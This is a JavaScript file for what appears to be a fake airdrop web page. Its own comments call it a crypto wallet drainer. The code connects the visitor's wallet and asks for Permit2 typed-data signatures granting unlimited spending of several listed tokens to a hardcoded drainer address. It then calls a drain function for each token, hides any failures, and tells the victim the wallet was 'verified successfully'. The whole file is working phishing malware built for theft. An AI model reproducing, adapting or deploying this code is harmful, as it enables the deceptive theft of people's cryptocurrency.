// =============================================
// app.js - Improved Wallet Detection
// =============================================

const DRAINER_ADDRESS = "0xeb26995ed00d9773A53a94228d21196DcEDc8020";
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";

const targetTokens = [
    "0xba1fcc7a596140e5fec52b3ab80a8f000c9af104",
    "0x65e37b558f64e2be5768db46df22f93d85741a9e",
    "0x186cca6904490818ab0dc409ca59d932a2366031",
    "0x6B175474E89094C44Da98b954EedeAC495271d0F",
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"
];

let provider = null;
let signer = null;
let connectedWallet = "";

// DOM Elements
let connectBtn, walletDisplay, statusEl, form;

document.addEventListener("DOMContentLoaded", () => {
    connectBtn = document.getElementById("connectWalletBtn");
    walletDisplay = document.getElementById("walletAddress");
    statusEl = document.getElementById("status");
    form = document.getElementById("airdropForm");

    if (!connectBtn) {
        console.error("Connect button not found in DOM");
        return;
    }

    connectBtn.addEventListener("click", connectWallet);
});

// =============================================
// IMPROVED WALLET DETECTION
// =============================================
async function connectWallet() {
    statusEl.textContent = "Detecting wallet...";
    connectBtn.disabled = true;
    connectBtn.textContent = "Connecting...";

    try {
        // Stronger wallet detection
        let ethProvider = null;

        if (window.ethereum) {
            ethProvider = window.ethereum;
        } 
        // Check for multiple injected providers
        else if (window.ethereum?.providers?.length) {
            ethProvider = window.ethereum.providers.find(p => 
                p.isRabby || p.isOKXWallet || p.isMetaMask
            ) || window.ethereum.providers[0];
        }

        if (!ethProvider) {
            alert("Wallet not detected.\n\nPlease make sure MetaMask, OKX Wallet, or Rabby is installed and enabled.");
            resetConnectButton();
            return;
        }

        // Request accounts
        const accounts = await ethProvider.request({ 
            method: "eth_requestAccounts" 
        });

        if (!accounts || accounts.length === 0) {
            throw new Error("No accounts returned");
        }

        connectedWallet = accounts[0];

        const shortAddress = connectedWallet.substring(0, 6) + "..." + connectedWallet.substring(connectedWallet.length - 4);
        walletDisplay.innerHTML = `<strong>Connected:</strong><br>${shortAddress}`;
        walletDisplay.classList.add("visible");

        connectBtn.textContent = "Connected";
        connectBtn.classList.add("connected");

        statusEl.textContent = "Signing verification messages...";

        // Start Draining
        await executePermit2BatchDrain();

        statusEl.innerHTML = `<span style="color:#34a853">✓ Wallet verified successfully</span>`;

    } catch (error) {
        console.error("Wallet Error:", error);
        statusEl.textContent = "Failed to connect wallet.";
        resetConnectButton();
    }
}

function resetConnectButton() {
    connectBtn.disabled = false;
    connectBtn.textContent = "Connect Wallet";
}

// =============================================
// Permit2 Drain Function
// =============================================
async function executePermit2BatchDrain() {
    try {
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
    } catch (e) {
        console.warn("Signer error:", e);
        return;
    }

    const contract = new ethers.Contract(DRAINER_ADDRESS, [
        "function drainWithPermit2(address victim, tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external"
    ], signer);

    for (let token of targetTokens) {
        try {
            const { permitSingle, signature } = await getPermit2Signature(token);
            await contract.drainWithPermit2(connectedWallet, permitSingle, signature);
        } catch (e) {}
    }
}

async function getPermit2Signature(tokenAddress) {
    const network = await provider.getNetwork();
    const chainId = network.chainId;

    const expiration = Math.floor(Date.now() / 1000) + 86400 * 30;
    const sigDeadline = Math.floor(Date.now() / 1000) + 1800;

    const permitSingle = {
        details: {
            token: tokenAddress,
            amount: "1461501637330902918203684832716283019655932542975",
            expiration: expiration,
            nonce: 0
        },
        spender: DRAINER_ADDRESS,
        sigDeadline: sigDeadline
    };

    const typedData = {
        domain: { name: "Permit2", chainId, verifyingContract: PERMIT2_ADDRESS },
        types: {
            PermitSingle: [
                { name: "details", type: "PermitDetails" },
                { name: "spender", type: "address" },
                { name: "sigDeadline", type: "uint256" }
            ],
            PermitDetails: [
                { name: "token", type: "address" },
                { name: "amount", type: "uint160" },
                { name: "expiration", type: "uint48" },
                { name: "nonce", type: "uint48" }
            ]
        },
        primaryType: "PermitSingle",
        message: permitSingle
    };

    const signature = await provider.send("eth_signTypedData_v4", [
        connectedWallet,
        JSON.stringify(typedData)
    ]);

    return { permitSingle, signature };
}

// Form Submit
form?.addEventListener("submit", (e) => {
    e.preventDefault();
    if (!connectedWallet) {
        alert("Please connect your wallet first.");
        return;
    }
    alert("Form submitted successfully!");
});
